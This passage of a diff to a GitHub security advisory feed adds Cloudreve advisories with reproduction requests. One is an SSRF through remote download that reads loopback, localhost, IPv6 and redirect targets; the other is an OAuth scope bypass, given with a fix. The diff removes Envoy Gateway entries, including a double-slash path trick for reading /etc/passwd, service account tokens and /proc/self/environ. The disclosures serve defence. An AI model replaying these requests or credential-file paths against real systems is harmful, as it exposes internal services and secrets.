+<p>Follow-up attacker readback was performed through normal workflow and file APIs:</p>
+<pre><code class="language-http">GET /api/v4/workflow?category=downloaded...
+GET /api/v4/file?uri=cloudreve://my...
+POST /api/v4/file/url
+</code></pre>
+<h2 id="root-cause">Root cause</h2>
+<p>The remote download workflow checks whether the user group has remote download permission, but it does not validate the submitted URL before passing it to the downloader.</p>
+<p>Relevant code paths:</p>
+<ul>
+<li><code>service/explorer/workflows.go:81</code></li>
+<li><code>pkg/filemanager/workflows/remote_download.go:202</code></li>
+<li><code>pkg/downloader/aria2/aria2.go:56</code></li>
+</ul>
+<p>The application does not block loopback, localhost, IPv6 localhost, or redirect targets resolving to internal addresses.</p>
+<h2 id="impact">Impact</h2>
+<p>A non-admin user with remote download permission can use Cloudreve as an SSRF primitive to access services reachable from the downloader environment.</p>
+<p>In my test, the attacker could fetch internal loopback URLs and read the response body after Cloudreve imported the downloaded content into the attacker's own files.</p>
+<p>Confirmed targets:</p>
+<ul>
+<li><code>http://127.0.0.1:7777/secret2</code></li>
+<li><code>http://localhost:7777/localsecret</code></li>
+<li><code>http://[::1]:7780/v6secret</code></li>
+<li>redirect to <code>http://127.0.0.1:7777/redirsecret</code></li>
+</ul>
+<p>This can expose internal HTTP services, loopback-only admin panels, local service metadata, or other network resources that are not directly reachable by the attacker.</p>
+<h2 id="reproduction">Reproduction</h2>
+<h3 id="1-permission-negative-control">1. Permission negative control</h3>
+<p>The attacker is a normal non-admin user in the default <code>User</code> group.</p>
+<p>Before enabling remote download for the group:</p>
+<pre><code class="language-http">POST /api/v4/workflow/download
+Content-Type: application/json
+
+{"src":["http://127.0.0.1:7777/secret"],"dst":"cloudreve://my"}
+</code></pre>
+<p>Response:</p>
+<pre><code class="language-json">{"code":40007,"msg":"Group not allowed to download files"}
+</code></pre>
+<h3 id="2-enable-only-remote-download-permission-for-the-non-admin-group">2. Enable only remote download permission for the non-admin group</h3>
+<p>The default install grants remote download to the admin group only. The default <code>User</code> group does not have it.</p>
+<p>Confirmed in:</p>
+<ul>
+<li><code>inventory/migration.go:154</code></li>
+<li><code>inventory/migration.go:179</code></li>
+</ul>
+<p>For this test, I only changed group 2 permissions from:</p>
+<pre><code class="language-text">hAg=
+</code></pre>
+<p>to:</p>
+<pre><code class="language-text">hAo=
+</code></pre>
+<p>The attacker remained in the <code>User</code> group and was not made admin. <code>GET /api/v4/user/me</code> still returned the group name as <code>User</code>.</p>
+<h3 id="3-start-an-internal-listener">3. Start an internal listener</h3>
+<p>Example listener on the Cloudreve host:</p>
+<pre><code class="language-text">127.0.0.1:7777
+</code></pre>
+<p>The listener returned a marker response:</p>
+<pre><code class="language-text">SSRF_SECRET_2_20260527
+</code></pre>
+<h3 id="4-queue-a-remote-download-to-loopback">4. Queue a remote download to loopback</h3>
+<pre><code class="language-http">POST /api/v4/workflow/download
+Content-Type: application/json
+
+{"src":["http://127.0.0.1:7777/secret2"],"dst":"cloudreve://my"}
+</code></pre>
+<p>Response:</p>
+<pre><code class="language-json">{"code":0,"data":[{"id":"OzH4","status":"queued","type":"remote_download"}]}
+</code></pre>
+<p>The internal listener received the request:</p>
+<pre><code class="language-text">127.0.0.1 - - [27/May/2026 13:00:46] "GET /secret2 HTTP/1.1" 200 -
+</code></pre>
+<p>Aria2 completed the download:</p>
+<pre><code class="language-text">Download complete: /home/b4r/cysec/cvehunting/cloudreve/data/temp/.../secret2
+</code></pre>
+<h3 id="5-read-the-imported-internal-response-as-the-attacker">5. Read the imported internal response as the attacker</h3>
+<p>The task completed successfully:</p>
+<pre><code class="language-json">{"id":"OzH4","status":"completed","summary":{"props":{"src_str":"http://127.0.0.1:7777/secret2","failed":0}}}
+</code></pre>
+<p>The attacker could list the imported file:</p>
+<pre><code class="language-json">{"name":"secret2","path":"cloudreve://my/secret2"}
+</code></pre>
+<p>The attacker could then download and read the response body:</p>
+<pre><code class="language-text">SSRF_SECRET_2_20260527
+</code></pre>
+<h2 id="additional-validated-variants">Additional validated variants</h2>
+<h3 id="localhost">localhost</h3>
+<p>Input:</p>
+<pre><code class="language-text">http://localhost:7777/localsecret
+</code></pre>
+<p>Attacker readback:</p>
+<pre><code class="language-text">LOCALHOST_SECRET_20260527
+</code></pre>
+<h3 id="redirect-to-loopback">Redirect to loopback</h3>
+<p>Input:</p>
+<pre><code class="language-text">http://127.0.0.1:7779/anything
+</code></pre>
+<p>Redirect:</p>
+<pre><code class="language-text">302 Location: http://127.0.0.1:7777/redirsecret
+</code></pre>
+<p>Attacker readback:</p>
+<pre><code class="language-text">REDIR_SECRET_20260527
+</code></pre>
+<h3 id="ipv6-localhost">IPv6 localhost</h3>
+<p>Input:</p>
+<pre><code class="language-text">http://[::1]:7780/v6secret
+</code></pre>
+<p>Attacker readback:</p>
+<pre><code class="language-text">IPV6_SECRET_20260527
+</code></pre>
+<h2 id="expected-behavior">Expected behavior</h2>
+<p>Cloudreve should reject remote download URLs that resolve to loopback, localhost, private network ranges, link-local ranges, metadata service ranges, or other internal-only targets unless explicitly allowed by an administrator.</p>
+<p>Redirect targets should be checked with the same policy.</p>
+<h2 id="actual-behavior">Actual behavior</h2>
+<p>Cloudreve accepts the URL, passes it to the downloader, imports the fetched internal response into the attacker's files, and allows the attacker to read it.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/cloudreve/cloudreve/security/advisories/GHSA-x756-g4x3-c64m">https://github.com/cloudreve/cloudreve/security/advisories/GHSA-x756-g4x3-c64m</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-54562">https://nvd.nist.gov/vuln/detail/CVE-2026-54562</a></li>
+<li><a href="https://github.com/cloudreve/cloudreve/commit/aaebf317a78f2413d74afd66c21a1f3143711312">https://github.com/cloudreve/cloudreve/commit/aaebf317a78f2413d74afd66c21a1f3143711312</a></li>
+<li><a href="https://github.com/cloudreve/cloudreve/releases/tag/4.16.1">https://github.com/cloudreve/cloudreve/releases/tag/4.16.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-x756-g4x3-c64m">https://github.com/advisories/GHSA-x756-g4x3-c64m</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-x756-g4x3-c64m</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-20T21:16:51.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/cloudreve/Cloudreve/v4] Cloudreve: OAuth access tokens bypass scope enforcement due to missing client_id claim]]></title>
+        <id>https://github.com/advisories/GHSA-vgj4-345g-jcf8</id>
+        <link href="https://github.com/advisories/GHSA-vgj4-345g-jcf8"/>
+        <updated>2026-07-20T21:15:24.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>  Cloudreve's OAuth access tokens can bypass OAuth scope enforcement.</p>
+<p>  This does not appear to be the intended design. The documentation describes OAuth client permissions/scopes, the API
+  has an insufficient-scope error code, and the code comments say <code>RequiredScopes(...)</code> should verify scopes when a
+  token has scopes, while skipping checks only for non-scoped session-based authentication.</p>
+<p>  However, OAuth access tokens are issued without the OAuth <code>client_id</code> claim. Later, the JWT verifier only loads scopes
+  into the request context when <code>claims.ClientID != ""</code>. Because the OAuth access token has no <code>client_id</code>, its scopes
+  are not loaded, and <code>RequiredScopes(...)</code> treats the request like a non-scoped first-party/session token and skips
+  scope checks.</p>
+<p>  As a result, a low-scope OAuth access token, for example one granted only <code>openid</code>, can call APIs requiring higher
+  scopes such as file, share, workflow, user setting, WebDAV account, and potentially admin scopes when the authorizing
+  user is an administrator.</p>
+<h2 id="why-this-seems-unintended">Why this seems unintended</h2>
+<p>  Cloudreve appears to have an explicit OAuth scope model:</p>
+<ol>
+<li>The official docs describe OAuth client permissions/scopes and require the authorization request to include
+  requested scopes.</li>
+<li>The API error code list includes an OAuth insufficient-scope error.</li>
+<li><code>RequiredScopes(...)</code> is used across sensitive API groups such as files, shares, workflows, user settings, WebDAV
+  devices, and admin APIs.</li>
+<li>The middleware comment says scope checks are skipped only when <code>hasScopes</code> is false, for example session-based
+  authentication.</li>
+<li>Default OAuth clients created during migration explicitly list scopes such as <code>Files.Write</code>, <code>Workflow.Write</code>, and
+  <code>Shares.Write</code>.</li>
+</ol>
+<p>  This suggests the intended design is:</p>
+<ul>
+<li>First-party/session tokens may be non-scoped and skip OAuth scope checks.</li>
+<li>OAuth access tokens should carry scope metadata and be checked against <code>RequiredScopes(...)</code>.</li>
+</ul>
+<p>  The current implementation makes OAuth access tokens fall into the first category by mistake.</p>
+<h2 id="affected-code">Affected code</h2>
+<p>  In the OAuth authorization code exchange, Cloudreve passes both <code>ClientID</code> and <code>Scopes</code> into token issuance:</p>
+<pre><code class="language-go">token, err := tokenAuth.Issue(c, &amp;auth.IssueTokenArgs{
+    User:               user,
+    ClientID:           s.ClientID,
+    Scopes:             authCode.Scopes,
+    RefreshTTLOverride: refreshTTLOverride,
+})
+
+Location:
+
+- service/oauth/oauth.go
+
+In Issue(...), the access token includes Scopes but does not include ClientID:
+
+accessToken, err := jwt.NewWithClaims(jwt.SigningMethodHS256, Claims{
+    TokenType: TokenTypeAccess,
+    RegisteredClaims: jwt.RegisteredClaims{
+        Subject:   uidEncoded,
+        NotBefore: jwt.NewNumericDate(issueDate),
+        ExpiresAt: jwt.NewNumericDate(accessTokenExpired),
+    },
+    Scopes: args.Scopes,
+}).SignedString(t.secret)
+
+By contrast, the refresh token does include both:
+
+Scopes:   args.Scopes,
+ClientID: args.ClientID,
+
+Location:
+
+- pkg/auth/jwt.go
+
+During request authentication, scopes are only inserted into request context if ClientID is present:
+
+if claims.ClientID != "" {
+    util.WithValue(c, ScopeContextKey{}, claims.Scopes)
+}
+
+Location:
+
+- pkg/auth/jwt.go
+
+Then CheckScope(...) skips scope enforcement if no scopes are present in context:
+
+hasScopes, tokenScopes := GetScopesFromContext(c)
+if !hasScopes {
+    return nil
+}
+
+Location:
+
+- pkg/auth/jwt.go
+
+RequiredScopes(...) relies on this check:
+
+if err := auth.CheckScope(c, requiredScopes...); err != nil {
+    c.JSON(200, serializer.Err(c, err))
+    c.Abort()
+    return
+}
+
+Location:
+
+- middleware/auth.go
+
+Sensitive route groups protected by RequiredScopes(...) include:
+
+- Files: Files.Read / Files.Write
+- Shares: Shares.Read / Shares.Write
+- Workflows: Workflow.Read / Workflow.Write
+- User settings and security info
+- WebDAV device/account management
+- Admin APIs: Admin.Read / Admin.Write
+
+Location:
+
+- routers/router.go
+
+## Reproduction steps
+
+1. Create or use an OAuth client with a low-privilege scope, for example only openid.
+2. Complete the OAuth authorization code flow for a normal user with:
+
+scope=openid
+
+3. Exchange the authorization code via:
+
+POST /api/v4/session/oauth/token
+
+4. Decode the returned access token.
+
+Expected token metadata should preserve enough OAuth client/scope context for later enforcement.
+
+Actual behavior:
+
+- The access token contains the requested scopes.
+- The access token does not contain client_id.
+
+5. Use the returned token as a bearer token:
+
+Authorization: Bearer &lt;access_token&gt;
+
+6. Call an API that requires a scope not granted to the OAuth app, for example an endpoint requiring Files.Read,
+   Files.Write, UserInfo.Write, or DavAccount.Write.
+
+Expected result:
+
+- The request should fail with an insufficient-scope error.
+
+Actual result:
+
+- The scope check is skipped because no scopes were inserted into the request context.
+- The request is processed as that user.
+
+If the authorizing user is an administrator, the same issue can affect admin APIs requiring Admin.Read or Admin.Write,
+because the request still runs as the admin user and the admin identity check can pass while the OAuth scope check is
+skipped.
+
+## Impact
+
+This is not an anonymous authentication bypass. The attacker still needs a valid OAuth access token for a real user.
+
+The impact is an OAuth consent/scope boundary bypass:
+
+- A third-party OAuth app can request a minimal scope such as openid.
+- After the user authorizes it, the app receives an access token.
+- That token can be used as a broader bearer token for the same user's Cloudreve account, despite not being granted
+  the required scopes.
+
+For normal users, this may allow access to or modification of files, shares, workflows, user settings, and WebDAV
+account/device settings depending on available APIs.
+
+For administrator users, it may allow access to admin-scoped functionality without the OAuth app being granted
+Admin.Read or Admin.Write.
+
+## Suggested fix
+
+1. Include ClientID: args.ClientID in access token claims when issuing OAuth access tokens:
+
+accessToken, err := jwt.NewWithClaims(jwt.SigningMethodHS256, Claims{
+    TokenType: TokenTypeAccess,
+    RegisteredClaims: jwt.RegisteredClaims{
+        Subject:   uidEncoded,
+        NotBefore: jwt.NewNumericDate(issueDate),
+        ExpiresAt: jwt.NewNumericDate(accessTokenExpired),
+    },
+    Scopes:   args.Scopes,
+    ClientID: args.ClientID,
+}).SignedString(t.secret)
+
+2. Consider making scope handling fail closed for OAuth tokens with malformed or inconsistent OAuth metadata.
+3. Add regression tests for an OAuth access token granted only openid attempting to call APIs requiring:
+    - Files.Read
+    - Files.Write
+    - UserInfo.Write
+    - DavAccount.Write
+    - Admin.Read
+    - Admin.Write
+
+Each should fail with an insufficient-scope error unless the corresponding scope was granted.
+### References
+
+- &lt;https://github.com/cloudreve/cloudreve/security/advisories/GHSA-vgj4-345g-jcf8&gt;
+- &lt;https://nvd.nist.gov/vuln/detail/CVE-2026-54560&gt;
+- &lt;https://github.com/cloudreve/cloudreve/commit/ed20843dc3df20a25fcaf6b538647e11c4d68d87&gt;
+- &lt;https://github.com/cloudreve/cloudreve/releases/tag/4.16.1&gt;
+- &lt;https://github.com/advisories/GHSA-vgj4-345g-jcf8&gt;
+</code></pre>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-vgj4-345g-jcf8</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-20T21:15:20.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/zalando/skipper] Skipper: Incomplete fix for CVE-2026-50197: an oversized body can bypass OPA deny-on-presence Rego policies]]></title>
         <id>https://github.com/advisories/GHSA-8qqm-fp2q-v734</id>
@@ -1693,172 +2440,5 @@ for _, repo := range newBuildAttributes.Repositories {
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-07-16T19:32:23.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/envoyproxy/gateway] Envoy Gateway: xDS Control Plane Information Disclosure when operating in GatewayNamespaceMode ]]></title>
-        <id>https://github.com/advisories/GHSA-22xc-xg2r-9j7v</id>
-        <link href="https://github.com/advisories/GHSA-22xc-xg2r-9j7v"/>
-        <updated>2026-07-16T19:32:26.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>When Envoy Gateway runs in GatewayNamespaceMode (<code>provider.kubernetes.deploy.type=GatewayNamespace</code>), the xDS gRPC server is configured with a <code>StreamInterceptor</code> for JWT authentication but no UnaryInterceptor. The go-control-plane xDS server exposes both streaming and unary (Fetch) RPC methods for all registered discovery services. Since there is no unary interceptor, these Fetch endpoints are completely unauthenticated. </p>
-<p>Additionally, the JWT authentication interceptor in GatewayNamespaceMode only validates tokens when the received gRPC message is of type <code>discoveryv3.DeltaDiscoveryRequest</code> . If the message is a <code>discoveryv3.DiscoveryRequest</code> — used by the State-of-the-World (SotW) xDS protocol — the type assertion fails, the validation block is skipped entirely, and RecvMsg returns nil (success) without any authentication.</p>
-<p>Any pod in the cluster that can reach the xDS server (port 18000) can use the SotW protocol to bypass JWT authentication and access:</p>
-<ul>
-<li>TLS private keys via StreamSecrets (SDS)</li>
-<li>All xDS resources via StreamAggregatedResources (ADS)</li>
-<li>Backend endpoints via StreamClusters / StreamEndpoints (CDS/EDS)</li>
-<li>Routing rules via StreamRoutes / StreamListeners (RDS/LDS)</li>
-</ul>
-<h3 id="credits">Credits</h3>
-<p>Envoy Gateway thanks @dashingDragon and @Donjon-Cerberus for reporting this issue.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/envoyproxy/gateway/security/advisories/GHSA-22xc-xg2r-9j7v">https://github.com/envoyproxy/gateway/security/advisories/GHSA-22xc-xg2r-9j7v</a></li>
-<li><a href="https://github.com/advisories/GHSA-22xc-xg2r-9j7v">https://github.com/advisories/GHSA-22xc-xg2r-9j7v</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-22xc-xg2r-9j7v</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-16T19:32:23.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/envoyproxy/gateway] Envoy Gateway: Authentication Bypass via Improper Input Validation in EnvoyExtensionPolicy Lua Allows Secret Disclosure]]></title>
-        <id>https://github.com/advisories/GHSA-wcrf-9vrr-854f</id>
-        <link href="https://github.com/advisories/GHSA-wcrf-9vrr-854f"/>
-        <updated>2026-07-16T19:23:40.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>The <code>to_absolute_normalized_path</code> function (security.lua:28-43) does not collapse redundant path separators (// → /). On Linux, <code>//etc/passwd</code> is equivalent to <code>/etc/passwd</code> (POSIX path semantics), but <code>is_critical_path</code> fails to match the double-slash variant because <code>//etc/passwd</code> does not start with <code>/etc/</code>.</p>
-<p>This allows Lua code submitted as an <code>EnvoyExtensionPolicy</code> to read arbitrary files from the gateway controller pod's filesystem during Strict validation (the default), including:</p>
-<ul>
-<li><code>/etc/passwd</code></li>
-<li>Kubernetes SA tokens via <code>//var/run/secrets/kubernetes.io/serviceaccount/token</code></li>
-<li>TLS certificates via <code>//certs/...</code></li>
-<li>Process environment via <code>//proc/self/environ</code></li>
-</ul>
-<p>These credentials can be used to read sensitive information from the K8s API Server or from the Gateway XDS server.</p>
-<h3 id="patches">Patches</h3>
-<p>This has been patched in versions &gt;= v1.7.4 and v1.8.1</p>
-<ul>
-<li>Collapse redundant path separators (<code>//</code> to <code>/</code>) so double-slash variants like <code>//etc/passwd</code> and <code>//var/run/secrets/...</code> are matched by the critical-path check.</li>
-<li>Rewrite the traversal check to reject any <code>.</code> or <code>..</code> segment in any position and across both separator styles (catches <code>/etc/./passwd</code>, <code>./etc/passwd</code>, <code>/etc/.</code>).</li>
-</ul>
-<h3 id="workarounds">Workarounds</h3>
-<p>Please refer to the <code>Warning</code> section in <a href="https://gateway.envoyproxy.io/v1.8/tasks/extensibility/lua/">Lua docs</a> for measures to reduce risk.</p>
-<h3 id="credits">Credits</h3>
-<p>Envoy Gateway thanks @dashingDragon and @Donjon-Cerberus for reporting this issue.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/envoyproxy/gateway/security/advisories/GHSA-wcrf-9vrr-854f">https://github.com/envoyproxy/gateway/security/advisories/GHSA-wcrf-9vrr-854f</a></li>
-<li><a href="https://github.com/advisories/GHSA-wcrf-9vrr-854f">https://github.com/advisories/GHSA-wcrf-9vrr-854f</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-wcrf-9vrr-854f</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-07-16T19:23:38.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/envoyproxy/gateway] Envoy Gateway: Authentication Bypass via Improper Input Validation in EnvoyExtensionPolicy Lua Allows Secret Disclosure]]></title>
-        <id>https://github.com/advisories/GHSA-wcrf-9vrr-854f</id>
-        <link href="https://github.com/advisories/GHSA-wcrf-9vrr-854f"/>
-        <updated>2026-07-16T19:23:40.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>The <code>to_absolute_normalized_path</code> function (security.lua:28-43) does not collapse redundant path separators (// → /). On Linux, <code>//etc/passwd</code> is equivalent to <code>/etc/passwd</code> (POSIX path semantics), but <code>is_critical_path</code> fails to match the double-slash variant because <code>//etc/passwd</code> does not start with <code>/etc/</code>.</p>
-<p>This allows Lua code submitted as an <code>EnvoyExtensionPolicy</code> to read arbitrary files from the gateway controller pod's filesystem during Strict validation (the default), including:</p>
-<ul>
-<li><code>/etc/passwd</code></li>
-<li>Kubernetes SA tokens via <code>//var/run/secrets/kubernetes.io/serviceaccount/token</code></li>
-<li>TLS certificates via <code>//certs/...</code></li>
-<li>Process environment via <code>//proc/self/environ</code></li>
-</ul>
-<p>These credentials can be used to read sensitive information from the K8s API Server or from the Gateway XDS server.</p>
-<h3 id="patches">Patches</h3>
-<p>This has been patched in versions &gt;= v1.7.4 and v1.8.1</p>
-<ul>
-<li>Collapse redundant path separators (<code>//</code> to <code>/</code>) so double-slash variants like <code>//etc/passwd</code> and <code>//var/run/secrets/...</code> are matched by the critical-path check.</li>
-<li>Rewrite the traversal check to reject any <code>.</code> or <code>..</code> segment in any position and across both separator styles (catches <code>/etc/./passwd</code>, <code>./etc/passwd</code>, <code>/etc/.</code>).</li>
-</ul>
-<h3 id="workarounds">Workarounds</h3>
-<p>Please refer to the <code>Warning</code> section in <a href="https://gateway.envoyproxy.io/v1.8/tasks/extensibility/lua/">Lua docs</a> for measures to reduce risk.</p>
-<h3 id="credits">Credits</h3>
-<p>Envoy Gateway thanks @dashingDragon and @Donjon-Cerberus for reporting this issue.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/envoyproxy/gateway/security/advisories/GHSA-wcrf-9vrr-854f">https://github.com/envoyproxy/gateway/security/advisories/GHSA-wcrf-9vrr-854f</a></li>
-<li><a href="https://github.com/advisories/GHSA-wcrf-9vrr-854f">https://github.com/advisories/GHSA-wcrf-9vrr-854f</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-wcrf-9vrr-854f</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-07-16T19:23:38.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/envoyproxy/gateway] Envoy Gateway: Wasm cache ServeHTTP reads mappingPath2Cache without lock]]></title>
-        <id>https://github.com/advisories/GHSA-8fv2-88gg-hm7q</id>
-        <link href="https://github.com/advisories/GHSA-8fv2-88gg-hm7q"/>
-        <updated>2026-07-16T19:21:15.000Z</updated>
-        <content type="html"><![CDATA[<p>Vulnerability report without repro case. Repro case may be added later after harness is complete.</p>
-<p><strong>Preconditions (4):</strong></p>
-<ul>
-<li>Pod-network reachability to :18002 (no auth)</li>
-<li>Tenant can create EnvoyExtensionPolicy (baseline)</li>
-<li>Attacker pod floods GET while churning EnvoyExtensionPolicy with distinct Wasm URLs</li>
-<li>Read at :153 must overlap a write at :201/:209 (probabilistic, attacker controls both rates)</li>
-</ul>
-<p><strong>Description:</strong></p>
-<p>httpserver.go:153 reads s.mappingPath2Cache with no lock while httpserver.go:201/209 write it under s.Lock(); the struct uses a plain map. Writer is tenant-reachable via EnvoyExtensionPolicy translation, reader is pod-network-reachable on :18002 with per-request goroutines. Go's concurrent map read+write detection calls runtime.throw, which net/http's per-conn recover cannot catch, so the controller process exits — cross-tenant control-plane DoS. Capped at MEDIUM: DoS-only, k8s restarts pod, timing-dependent trigger.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/envoyproxy/gateway/security/advisories/GHSA-8fv2-88gg-hm7q">https://github.com/envoyproxy/gateway/security/advisories/GHSA-8fv2-88gg-hm7q</a></li>
-<li><a href="https://github.com/advisories/GHSA-8fv2-88gg-hm7q">https://github.com/advisories/GHSA-8fv2-88gg-hm7q</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-8fv2-88gg-hm7q</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-16T19:21:15.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/envoyproxy/gateway] Envoy Gateway: Wasm cache ServeHTTP reads mappingPath2Cache without lock]]></title>
-        <id>https://github.com/advisories/GHSA-8fv2-88gg-hm7q</id>
-        <link href="https://github.com/advisories/GHSA-8fv2-88gg-hm7q"/>
-        <updated>2026-07-16T19:21:15.000Z</updated>
-        <content type="html"><![CDATA[<p>Vulnerability report without repro case. Repro case may be added later after harness is complete.</p>
-<p><strong>Preconditions (4):</strong></p>
-<ul>
-<li>Pod-network reachability to :18002 (no auth)</li>
-<li>Tenant can create EnvoyExtensionPolicy (baseline)</li>
-<li>Attacker pod floods GET while churning EnvoyExtensionPolicy with distinct Wasm URLs</li>
-<li>Read at :153 must overlap a write at :201/:209 (probabilistic, attacker controls both rates)</li>
-</ul>
-<p><strong>Description:</strong></p>
-<p>httpserver.go:153 reads s.mappingPath2Cache with no lock while httpserver.go:201/209 write it under s.Lock(); the struct uses a plain map. Writer is tenant-reachable via EnvoyExtensionPolicy translation, reader is pod-network-reachable on :18002 with per-request goroutines. Go's concurrent map read+write detection calls runtime.throw, which net/http's per-conn recover cannot catch, so the controller process exits — cross-tenant control-plane DoS. Capped at MEDIUM: DoS-only, k8s restarts pod, timing-dependent trigger.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/envoyproxy/gateway/security/advisories/GHSA-8fv2-88gg-hm7q">https://github.com/envoyproxy/gateway/security/advisories/GHSA-8fv2-88gg-hm7q</a></li>
-<li><a href="https://github.com/advisories/GHSA-8fv2-88gg-hm7q">https://github.com/advisories/GHSA-8fv2-88gg-hm7q</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-8fv2-88gg-hm7q</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-16T19:21:15.000Z</published>
     </entry>
 </feed>
